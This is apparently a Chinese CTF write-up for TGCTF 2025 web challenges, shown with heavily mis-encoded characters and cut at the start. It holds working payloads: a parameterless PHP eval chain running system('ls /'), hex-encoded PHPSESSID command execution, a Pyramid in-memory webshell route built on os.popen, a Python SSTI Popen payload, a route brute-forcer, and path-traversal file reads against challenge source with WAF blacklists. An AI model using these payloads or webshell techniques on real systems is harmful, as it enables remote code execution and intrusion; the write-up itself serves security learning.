çš„æ‰§è¡Œæµç¨‹\ræ‹†è§£å†…å±‚ eval çš„å‚æ•° end(current(get_defined_vars()))ï¼š\næ­¥éª¤ 3.1ï¼šget_defined_vars() è¿”å›å½“å‰ä½œç”¨åŸŸçš„æ‰€æœ‰å·²å®šä¹‰å˜é‡ï¼ˆåŒ…æ‹¬è¶…å…¨å±€å˜é‡ $_GETã€$_SERVER ç­‰ï¼‰ã€‚ è¿”å›çš„æ•°ç»„ç»“æ„ç±»ä¼¼ï¼š\n1 2 3 4 5 6 7 8 9 php array( \u0026#39;_GET\u0026#39; =\u0026gt; array( \u0026#39;a\u0026#39; =\u0026gt; \u0026#39;eval(end(current(get_defined_vars())))\u0026#39;, \u0026#39;b\u0026#39; =\u0026gt; \u0026#39;system(\\\u0026#39;ls /\\\u0026#39;)\u0026#39; ), // å…¶ä»–å˜é‡å¦‚ $_SERVERã€$_POST ç­‰ // è„šæœ¬ä¸­å¯èƒ½å®šä¹‰çš„å…¶ä»–å˜é‡ ); æ­¥éª¤ 3.2ï¼šcurrent(get_defined_vars()) å– get_defined_vars() è¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ $_GETï¼Œåˆ™è¿”å› $_GET æ•°ç»„ï¼š\n1 2 php array(\u0026#39;a\u0026#39; =\u0026gt; \u0026#39;...\u0026#39;, \u0026#39;b\u0026#39; =\u0026gt; \u0026#39;...\u0026#39;); æ­¥éª¤ 3.3ï¼šend(current(get_defined_vars())) å°† $_GET æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚å‡è®¾å‚æ•° b æ˜¯æœ€åä¸€ä¸ªå…ƒç´ ï¼Œåˆ™è¿”å› system('ls /')ã€‚\næ­¥éª¤ 3.4ï¼šå¤–å±‚ eval æ‰§è¡Œç»“æœ æœ€ç»ˆæ‰§è¡Œ eval(\u0026quot;system('ls /')\u0026quot;)ï¼Œå³è°ƒç”¨ system('ls /')ï¼Œæ‰§è¡Œ Linux å‘½ä»¤ ls /ï¼Œåˆ—å‡ºæ ¹ç›®å½•å†…å®¹ã€‚\nPHPSESSIDç»•è¿‡\rå½“è¯·æ±‚å¤´ä¸­æœ‰cookieæ—¶ï¼Œï¼ˆ æˆ–è€…èµ°æŠ•æ— è·¯æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ cookie ï¼‰è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘ä½¿ç”¨PHPSESSIDç»•è¿‡\nhex2binï¼ˆï¼‰\rhex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æ¶æ„ä»£ç è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œç„¶ååœ¨å†™å…¥cookieä¸­ï¼Œä»è€Œè¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„\nä¾‹ï¼š\nphpinfo();çš„åå…­è¿›åˆ¶ç¼–ç ï¼Œå³706870696e666f28293b\nä¼ å…¥Payload:\n?å‚æ•°=eval(hex2bin(session_id(session_start())));\nç„¶ååœ¨cookieä¸­å†™å…¥ï¼š\ncookie: PHPSESSID=706870696e666f28293b\nTGCTFä¸­çš„é¢„æœŸè§£å°±æ˜¯è¿™æ ·ï¼š\n1 2 3 ?tgctf2025=session_start();system(hex2bin(session_id())); PHPSESSID=636174202f666c6167 cat /flagçš„åå…­è¿›åˆ¶ å‚è€ƒï¼š\næ— å‚æ•°RCEç»•è¿‡çš„è¯¦ç»†æ€»ç»“ï¼ˆå…­ç§æ–¹æ³•ï¼‰ æ·±å…¥æµ…å‡ºå¸¦ä½ å­¦ä¹ æ— å‚RCE php å‘½ä»¤æ‰§è¡Œä¸­ PHPSESSID å¦™ç”¨\nå†…å­˜é©¬ï¼Œpyramid æ¡†æ¶å†…å­˜é©¬\rå†…å­˜é©¬\rè¿™ä¸ªåé¢å¦å¤–è¯¦ç»†å†™ä¸€ç¯‡è¿›è¡Œæ•´ç†\npyramid æ¡†æ¶å†…å­˜é©¬\rè¿™é“é¢˜ä¸­æˆ‘ä»¬æ³¨æ„åˆ°ï¼š\n1 2 3 4 5 6 python def checkExpr(expr_input): expr = re.split(r\u0026#34;[-+]\u0026#34;, expr_input) print(exec(expr_input)) # è‡´å‘½æ¼æ´ï¼šæœªè¿‡æ»¤ç›´æ¥æ‰§è¡Œç”¨æˆ·è¾“å…¥ï¼ if len(expr) != 2: return 0 è¿™ä¸€éƒ¨åˆ†å®Œå…¨æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾åœ°ä¼ é€’ expr æ¥å†™å…¥å†…å­˜é©¬\næˆ‘ä»¬è¿™æ ·æ³¨å…¥ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 python expr=exec(\u0026#34; # è·å–å½“å‰é…ç½®å™¨ï¼ˆç¡®ä¿ä½œç”¨åŸŸæ­£ç¡®ï¼‰ from pyramid.threadlocal import get_current_registry registry = get_current_registry() config = registry.settings[\u0026#39;pyramid.configurator\u0026#39;] # æ·»åŠ è·¯ç”±å’Œè§†å›¾ config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;) config.add_view( lambda req: Response(__import__(\u0026#39;os\u0026#39;).popen(req.params.get(\u0026#39;cmd\u0026#39;)).read()), route_name=\u0026#39;shell\u0026#39; ) config.commit() # å…³é”®ï¼æäº¤é…ç½®å˜æ›´ \u0026#34;)#+1 åé¢è®¿é—® shell è·¯ç”±æ¥RCEå°±è¡Œ\nè¿™é“é¢˜ä¸­çš„å†…å­˜é©¬æ¯”è¾ƒå¥½å†™ï¼Œå®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼ŒPyramidåˆå…è®¸åœ¨è¿è¡Œæ—¶åŠ¨æ€ä¿®æ”¹è·¯ç”±é…ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¾€è¿›åŠ åé—¨è·¯ç”±å°±å¥½äº†\nSSTIï¼Œç±»ç»§æ‰¿åˆ©ç”¨\rPayload:\n1 2 3 4 5 6 python ( [].__class__.__mro__[1].__subclasses__()[351]( \u0026#39;cat flag\u0026#39;, shell=True, stdout=-1 ).communicate()[0].strip() ) ç”¨AIè§£é‡Šä¸€ä¸‹ï¼š\nè¿™ä¸ªä»£ç ç‰‡æ®µæ˜¯ä¸€ä¸ªå…¸å‹çš„ Python SSTIï¼ˆServer-Side Template Injectionï¼‰æ”»å‡» Payloadï¼Œé€šè¿‡æ»¥ç”¨ Python çš„åå°„å’Œç»§æ‰¿æœºåˆ¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯å…¶è¯¦ç»†è§£é‡Šå’Œå·¥ä½œåŸç†åˆ†æï¼š\nä»£ç ç»“æ„æ‹†è§£\n1 2 3 4 5 6 python ( [].__class__.__mro__[1].__subclasses__()[351]( \u0026#39;cat flag\u0026#39;, shell=True, stdout=-1 ).communicate()[0].strip() ) é€å±‚è§£æ\n[]ï¼ˆç©ºåˆ—è¡¨ï¼‰ åˆ›å»ºä¸€ä¸ªç©ºåˆ—è¡¨å¯¹è±¡ï¼Œä½œä¸ºåç»­æ“ä½œçš„èµ·ç‚¹ã€‚ .__class__ è·å–åˆ—è¡¨å¯¹è±¡çš„ç±»ï¼ˆå³\n1 list ç±»ï¼‰ï¼š\n1 2 python list_class = [].__class__ # ç­‰ä»·äº list .__mro__ 1 __mro__ æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œè¡¨ç¤ºç±»çš„\næ–¹æ³•è§£æé¡ºåº\nï¼ˆMethod Resolution Orderï¼‰ã€‚å¯¹äº\n1 list ç±»ï¼Œå…¶ç»§æ‰¿é“¾ä¸ºï¼š\n1 2 plaintext list â†’ object å› æ­¤ï¼š\n1 2 python mro_tuple = list_class.__mro__ # è¾“å‡ºï¼š(list, object) [1]ï¼ˆå–ç¬¬äºŒä¸ªå…ƒç´ ï¼‰ å–\n1 __mro__ çš„ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå³\n1 object ç±»ï¼‰ï¼š\n1 2 python object_class = mro_tuple[1] # ç­‰ä»·äº object .__subclasses__() 1 object ç±»çš„\n1 __subclasses__() æ–¹æ³•è¿”å›\næ‰€æœ‰ç›´æ¥å­ç±»çš„åˆ—è¡¨\nã€‚è¿™äº›å­ç±»åŒ…æ‹¬ Python å†…ç½®çš„è®¸å¤šç±»ï¼Œä¾‹å¦‚ï¼š\ntypeï¼ˆå…ƒç±»ï¼‰\nint, str, list, dict ç­‰åŸºæœ¬ç±»å‹\nsubprocess.Popenï¼ˆå…³é”®ç‚¹ï¼ï¼‰\nå…¶ä»–ç³»ç»Ÿçº§ç±»\n1 2 python subclasses = object_class.__subclasses__() [351]ï¼ˆç´¢å¼• 351ï¼‰ é€šè¿‡ç´¢å¼•\n1 351 å®šä½åˆ°\n1 subprocess.Popen ç±»ï¼š\n1 2 python Popen_class = subclasses[351] å…³é”®ç‚¹ï¼šç´¢å¼• 351 æ˜¯æ ¹æ®ç‰¹å®š Python ç‰ˆæœ¬å’Œç¯å¢ƒç¡®å®šçš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Python 3.8 ä¸­ï¼Œsubprocess.Popen çš„ç´¢å¼•å¯èƒ½ä¸º 351ï¼Œä½†ä¸åŒç‰ˆæœ¬æˆ–ç¯å¢ƒå¯èƒ½ä¸åŒã€‚ è°ƒç”¨ Popen æ„é€ å‡½æ•° ä½¿ç”¨\n1 Popen ç±»åˆ›å»ºè¿›ç¨‹å¯¹è±¡ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š\n1 2 python process = Popen_class(\u0026#39;cat flag\u0026#39;, shell=True, stdout=-1) 'cat flag'ï¼šè¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ã€‚ shell=Trueï¼šå…è®¸é€šè¿‡ shell æ‰§è¡Œå‘½ä»¤ï¼ˆå±é™©ï¼ï¼‰ã€‚ stdout=-1ï¼šç­‰åŒäº stdout=subprocess.PIPEï¼Œæ•è·æ ‡å‡†è¾“å‡ºã€‚ .communicate() ç­‰å¾…è¿›ç¨‹å®Œæˆï¼Œå¹¶è¿”å›\n1 (stdout_data, stderr_data) å…ƒç»„ï¼š\n1 2 python output_tuple = process.communicate() [0].strip() è·å–æ ‡å‡†è¾“å‡ºï¼ˆ\n1 stdout_data ï¼‰å¹¶å»é™¤é¦–å°¾ç©ºç™½å­—ç¬¦ï¼š\n1 2 python result = output_tuple[0].strip() ","date":"2025-06-01T10:32:07+08:00","permalink":"https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/","title":"TGCTFçŸ¥è¯†æ¢³ç†"},{"content":"è¿™æ¬¡æ˜¯å’Œå¾å¸ˆå‚…ï¼Œé¡¾å¸ˆå‚…ï¼Œæ¢å¸ˆå‚…ä¸€èµ·æ‰“çš„ï¼Œå„æ–¹å‘éƒ½å†™åœ¨ä¸€èµ·äº†ï¼Œè·ç¦»äº”åååªå·®ä¸€æ­¥ä¹‹é¥ï¼Œè¿˜æ˜¯æˆ‘æŠ€æœ¯ä¸å¤Ÿç²¾æ¹›çš„åŸå› \nWeb\rè¿™æ¬¡TGCTF Webæ–¹é¢ç»™äº†æˆ‘å¾ˆå¤§çš„æŒ«è´¥æ„Ÿï¼Œæ„Ÿè§‰å¯¹å¾ˆå¤šçŸ¥è¯†çš„äº†è§£éƒ½éå¸¸æµ…è–„ï¼Œä¸€ç›´åšä¸å‡ºé¢˜ï¼Œè¿˜æ˜¯è¦ä¸‹è‹¦åŠŸå¤«ç²¾è¿›æŠ€æœ¯\nç«çœ¼è¾©é­‘é­…\rè¿™é“é¢˜å¾ˆç®€å•çš„ç­¾åˆ°é¢˜ï¼Œdirsearch æ‰«ä¸€ä¸‹å¾—åˆ°å‡ ä¸ªæ–‡ä»¶è·¯å¾„ï¼ŒçœŸæ­£èƒ½æ‰“é€šçš„æ˜¯ shell.php ï¼Œç›´æ¥èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ° flag\nAAAå·æ¸¡é˜´å¹³\ræ— å‚RCE\nå¯ä»¥çœ‹çœ‹è¿™ç¯‡\næ— å‚æ•°RCEç»•è¿‡çš„è¯¦ç»†æ€»ç»“(å…­ç§æ–¹æ³•)\nç›´é¢å¤©å‘½\rè¿™é“é¢˜å¾ˆå¥½ç©\nä¸€å¼€å§‹çœ‹å‡ºæ¥æ˜¯ SSTI ï¼Œä½†æ˜¯æ‹¼å°½å…¨åŠ›æ— æ³•æ³¨å…¥ã€‚\nF12çœ‹ç½‘é¡µæºç ï¼Œæç¤ºä¸æ­¢ä¸€ä¸ªè·¯ç”±ï¼Œè¿› /hint çœ‹çœ‹\næç¤ºæœ‰å››ä¸ªå­—æ¯çš„è·¯ç”±ï¼Œå†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 python # è·¯ç”±çˆ†ç ´è„šæœ¬ import sys import requests import argparse from concurrent.futures import ThreadPoolExecutor, as_completed from itertools import product def generate_four_letter_paths(): \u0026#34;\u0026#34;\u0026#34;ç”Ÿæˆæ‰€æœ‰å››ä¸ªå°å†™å­—æ¯çš„ç»„åˆï¼ˆå¦‚ aaaa, aaab, ..., zzzzï¼‰\u0026#34;\u0026#34;\u0026#34; letters = \u0026#39;abcdefghijklmnopqrstuvwxyz\u0026#39; for chars in product(letters, repeat=4): yield \u0026#39;\u0026#39;.join(chars) def check_url(base_url, path, results): full_url = f\u0026#34;{base_url}/{path}\u0026#34; try: response = requests.get( full_url, timeout=3, headers={\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0\u0026#39;}, allow_redirects=False # é¿å…é‡å®šå‘å¹²æ‰°çŠ¶æ€ç åˆ¤æ–­ ) if response.status_code == 200: results.append(full_url) print(f\u0026#34;[+] {full_url} - {response.status_code}\u0026#34;) except requests.exceptions.RequestException as e: pass # å¿½ç•¥è¶…æ—¶ã€è¿æ¥é”™è¯¯ç­‰å¼‚å¸¸ def main(): parser = argparse.ArgumentParser(description=\u0026#39;å››å­—æ¯è·¯å¾„çˆ†ç ´å·¥å…·\u0026#39;) parser.add_argument(\u0026#39;target\u0026#39;, help=\u0026#39;ç›®æ ‡URLï¼ˆå¦‚ http://example.comï¼‰\u0026#39;) parser.add_argument(\u0026#39;-t\u0026#39;, \u0026#39;--threads\u0026#39;, type=int, default=50, help=\u0026#39;çº¿ç¨‹æ•°ï¼ˆé»˜è®¤50ï¼‰\u0026#39;) parser.add_argument(\u0026#39;-o\u0026#39;, \u0026#39;--output\u0026#39;, help=\u0026#39;è¾“å‡ºç»“æœæ–‡ä»¶\u0026#39;) args = parser.parse_args() base_url = args.target.rstrip(\u0026#39;/\u0026#39;) results = [] # ç”Ÿæˆæ‰€æœ‰å››ä¸ªå°å†™å­—æ¯çš„ç»„åˆ paths = generate_four_letter_paths() with ThreadPoolExecutor(max_workers=args.threads) as executor: futures = [] for path in paths: futures.append(executor.submit(check_url, base_url, path, results)) # å®æ—¶æ›´æ–°è¿›åº¦ï¼ˆå¯é€‰ï¼‰ total = 26 ** 4 # æ€»å…±æœ‰26^4=456,976ç§ç»„åˆ completed = 0 for _ in as_completed(futures): completed += 1 if completed % 1000 == 0: print(f\u0026#34;è¿›åº¦ï¼š{completed}/{total}\u0026#34;, end=\u0026#39;\\r\u0026#39;) print(\u0026#34;\\nçˆ†ç ´å®Œæˆï¼æ‰¾åˆ°ä»¥ä¸‹æœ‰æ•ˆè·¯å¾„ï¼š\u0026#34;) for url in results: print(url) if args.output: with open(args.output, \u0026#39;w\u0026#39;) as f: for url in results: f.write(f\u0026#34;{url}\\n\u0026#34;) print(f\u0026#34;ç»“æœå·²ä¿å­˜åˆ° {args.output}\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;è­¦å‘Šï¼šè¯·ç¡®ä¿æ‚¨å·²è·å¾—ç›®æ ‡ç½‘ç«™çš„åˆæ³•æˆæƒï¼\u0026#34;) main() çˆ†ç ´å‡º /aazz è·¯ç”±ï¼Œè¿›å» F12 çœ‹çœ‹ï¼Œè¯´æ˜¯å¯ä»¥ä¼ å‚çœ‹æºç (åˆè¦çˆ†å— QAQ )ï¼Œåé¢é—®å‡ºé¢˜äººè¯´å¯ä»¥ä¼  filename ï¼Œ\nç„¶åGETä¼  filename=../app.py çœ‹çœ‹æºç ï¼ˆæç¤ºçœ‹æºç ï¼‰\næºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 python import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key # æ½œåœ¨é£é™©ï¼šsecret_keyå¯èƒ½æš´éœ²åœ¨æºç ä¸­ app = Flask(__name__) # å®‰å…¨é£é™©ï¼šé»‘åå•ä¸å®Œæ•´ï¼Œå¯èƒ½è¢«ç»•è¿‡ black_list = [\u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;import\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;_\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;read\u0026#39;, \u0026#39;base\u0026#39;, \u0026#39;globals\u0026#39;] def waf(name): \u0026#34;\u0026#34;\u0026#34;åŸºç¡€WAFè¿‡æ»¤\u0026#34;\u0026#34;\u0026#34; for x in black_list: if x in name.lower(): return True return False def is_typable(char): \u0026#34;\u0026#34;\u0026#34;æ£€æŸ¥å­—ç¬¦æ˜¯å¦å¯æ‰“å°\u0026#34;\u0026#34;\u0026#34; typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): \u0026#34;\u0026#34;\u0026#34;é¦–é¡µè·¯ç”±\u0026#34;\u0026#34;\u0026#34; return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): \u0026#34;\u0026#34;\u0026#34;æ ¸å¿ƒå¤„ç†è·¯ç”±ï¼ˆå­˜åœ¨ä¸¥é‡æ¼æ´ï¼‰\u0026#34;\u0026#34;\u0026#34; template1 = \u0026#34;\u0026#34; template2 = \u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; # WAFè¿‡æ»¤ if waf(name): template = \u0026#39;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹\\nImage\u0026#39; else: # æ£€æŸ¥å­—ç¬¦æ˜¯å¦å¯æ‰“å° k = 0 for i in name: if not is_typable(i): k = 1 break if k == 1: # æ£€æŸ¥æ˜¯å¦åŒ…å«secret_keyå‰ç¼€ï¼ˆé€»è¾‘ç¼ºé™·ï¼‰ if not (secret_key[:2] in name and secret_key[2:]): return render_template_string(\u0026#39;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§\\n\\nå†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ\\nImage\u0026#39;) # æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼šæ›¿æ¢ä¸º{{}}è¯­æ³• template1 = \u0026#34;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ{{}}â€\\næœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†\\n\u0026#34; template = template.replace(\u0026#34;ç›´é¢\u0026#34;, \u0026#34;{{\u0026#34;).replace(\u0026#34;å¤©å‘½\u0026#34;, \u0026#34;}}\u0026#34;) # æ£€æŸ¥catå…³é”®è¯ if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39;\\næˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ\\nImage\u0026#39; # æ¸²æŸ“æ¨¡æ¿ï¼ˆå­˜åœ¨æ³¨å…¥é£é™©ï¼‰ try: return template1 + render_template_string(template) + render_template_string(template2) except Exception as e: return f\u0026#34;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š\\n{template}\u0026#34;, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): \u0026#34;\u0026#34;\u0026#34;æç¤ºè·¯ç”±\u0026#34;\u0026#34;\u0026#34; return render_template_string(\u0026#34;hintï¼š\\næœ‰ä¸€ä¸ªç”±4ä¸ªå°å†™è‹±æ–‡å­—æ¯ç»„æˆçš„è·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!\u0026#34;) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): \u0026#34;\u0026#34;\u0026#34;æ–‡ä»¶è¯»å–è·¯ç”±ï¼ˆå­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼‰\u0026#34;\u0026#34;\u0026#34; filename = request.args.get(\u0026#39;filename\u0026#39;, \u0026#39;\u0026#39;) # åˆå§‹å¤„ç† if not filename: return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;file.html\u0026#39;) # æ–‡ä»¶åæ£€æŸ¥ï¼ˆé€»è¾‘é”™è¯¯ï¼šåŸä»£ç å­˜åœ¨è¯­æ³•é—®é¢˜ï¼‰ if not filename.replace(\u0026#39;_\u0026#39;, \u0026#39;\u0026#39;).isalnum(): return jsonify({\u0026#39;error\u0026#39;: \u0026#39;åªå…è®¸å­—æ¯å’Œæ•°å­—ï¼\u0026#39;}), 400 # è·¯å¾„éå†æ¼æ´ï¼šç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„filename if os.path.isfile(filename): try: with open(filename, \u0026#39;r\u0026#39;) as file: content = file.read() return content except Exception as e: return jsonify({\u0026#39;error\u0026#39;: str(e)}), 500 else: return jsonify({\u0026#39;error\u0026#39;: \u0026#39;è·¯å¾„ä¸å­˜åœ¨æˆ–è€…è·¯å¾„éæ³•\u0026#39;}), 404 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) è¿™é“é¢˜æœ¬æ¥æ˜¯è€ƒSSTIçš„ï¼Œä½†æ€ä¹ˆéƒ½ç»•ä¸è¿‡é˜²ç«å¢™ï¼Œä½†æœ‰éé¢„æœŸè§£\næˆ‘ä»¬çŸ¥é“ /aazz ç›®å½•ä¸‹å¯ä»¥ä¼ å‚è¯»å–æ–‡ä»¶çš„\næˆ‘ä»¬ç›´æ¥è¯»flagï¼š\nPayload: http://node1.tgctf.woooo.tech:30904/aazz?filename=flag\nè¯»åˆ°flag\nç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰\rè¿™é“é¢˜æˆ‘æ²¡åšå‡ºæ¥ï¼ŒæŠŠæºç æ”¾åœ¨è¿™æ–¹ä¾¿åé¢å¤ç°\nå¤ä»‡ç›´æ¥banäº†ä¼ å‚è¯»æ–‡ä»¶åŠŸèƒ½ï¼Œç›´æ¥å›æ˜¾æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 python import os import string from flask import Flask, request, render_template_string, jsonify, send_from_directory from a.b.c.d.secret import secret_key app = Flask(__name__) black_list=[\u0026#39;lipsum\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;%\u0026#39;,\u0026#39;{\u0026#39;,\u0026#39;}\u0026#39;,\u0026#39;map\u0026#39;,\u0026#39;chr\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;get\u0026#39;, \u0026#34;url\u0026#34;, \u0026#39;pop\u0026#39;,\u0026#39;include\u0026#39;,\u0026#39;popen\u0026#39;,\u0026#39;os\u0026#39;,\u0026#39;import\u0026#39;,\u0026#39;eval\u0026#39;,\u0026#39;_\u0026#39;,\u0026#39;system\u0026#39;,\u0026#39;read\u0026#39;,\u0026#39;base\u0026#39;,\u0026#39;globals\u0026#39;,\u0026#39;_.\u0026#39;,\u0026#39;set\u0026#39;,\u0026#39;application\u0026#39;,\u0026#39;getitem\u0026#39;,\u0026#39;request\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;arg\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;app\u0026#39;, \u0026#39;self\u0026#39;] def waf(name): for x in black_list: if x in name.lower(): return True return False def is_typable(char): # å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›† typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars @app.route(\u0026#39;/\u0026#39;) def home(): return send_from_directory(\u0026#39;static\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/jingu\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def greet(): template1=\u0026#34;\u0026#34; template2=\u0026#34;\u0026#34; name = request.form.get(\u0026#39;name\u0026#39;) template = f\u0026#39;{name}\u0026#39; if waf(name): template = \u0026#39;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹ Image\u0026#39; else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = \u0026#39;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§ å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ Image\u0026#39; return render_template_string(template) template1 = \u0026#34;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ{{}}â€ æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº† \u0026#34; template= template.replace(\u0026#34;å¤©å‘½\u0026#34;,\u0026#34;{{\u0026#34;).replace(\u0026#34;éš¾è¿\u0026#34;,\u0026#34;}}\u0026#34;) template = template if \u0026#34;cat\u0026#34; in template: template2 = \u0026#39; æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ Image\u0026#39; try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f\u0026#34;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š {template}\u0026#34; return error_message, 400 @app.route(\u0026#39;/hint\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def hinter(): template=\u0026#34;hintï¼š æœ‰ä¸€ä¸ªaazzè·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!\u0026#34; return render_template_string(template) @app.route(\u0026#39;/aazz\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def finder(): with open(__file__, \u0026#39;r\u0026#39;) as f: source_code = f.read() return f\u0026#34; {source_code} \u0026#34;, 200, {\u0026#39;Content-Type\u0026#39;: \u0026#39;text/html; charset=utf-8\u0026#39;} if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=80) å¾ˆéš¾ç»•çš„ SSTI 